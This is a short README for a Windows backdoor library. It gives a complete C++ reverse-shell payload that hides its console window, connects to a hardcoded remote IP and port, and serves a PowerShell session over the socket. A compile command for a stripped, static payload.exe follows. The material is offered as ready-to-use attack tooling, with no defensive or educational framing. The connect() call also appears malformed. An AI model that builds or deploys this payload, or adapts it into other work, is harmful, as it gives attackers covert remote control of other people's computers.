# WinBackdoorLib
a simple module to create "reverse shell or backdoor" simply with Windows API

![Image1](capture.PNG)


## example Payload :
  ```cpp
#include "backdoorlib.h"
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>
#include <wininet.h>
#include <windows.h>

#pragma comment(lib,"Ws2_32.lib")

#define REMOTE_ADDR "192.168.1.71"
#define REMOTE_PORT 4444

int main()
{
    hide_console();
    WSADATA wsa_version;
    SOCKET socks;

    struct sockaddr_in session;

    session.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    session.sin_family = AF_INET;
    session.sin_port = htons(REMOTE_PORT);

    WSAStartup(MAKEWORD(2,2),&wsa_version);
    socks = WSASocket(AF_INET, SOCK_STREAM,IPPROTO_TCP,0,0,0);
    int c = connect(socks,session);
    if (c == 0)
	{
        execute_powershell(socks);
    }
    return 0;
}
  ```

## Compile Payload :
  ### g++ backdoorlib.cpp reverse_powershell.cpp -o payload.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -lwininet
